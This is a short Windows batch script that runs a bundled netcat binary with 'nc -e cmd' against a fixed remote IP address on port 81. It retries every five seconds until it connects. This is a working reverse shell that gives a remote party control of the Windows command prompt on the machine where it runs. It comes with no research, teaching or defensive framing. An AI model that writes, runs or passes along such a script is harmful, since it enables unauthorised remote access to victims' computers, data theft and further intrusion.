@echo off

:: Define the path to nc.exe (assuming it's in the same directory as the script)
set "ncexe_path=%~dp0nc.exe"

:: Add the directory containing nc.exe to the PATH temporarily
set "PATH=%PATH%;%~dp0"

:retry
:: Attempting to execute nc.exe...
nc -e cmd 164.92.112.50 81
:: Check the exit code of nc.exe
if %errorlevel% neq 0 (
    :: Execution failed. Retrying in 5 seconds...
    timeout /t 5 /nobreak > NUL
    goto retry
)
:: Execution succeeded.

exit /b 0
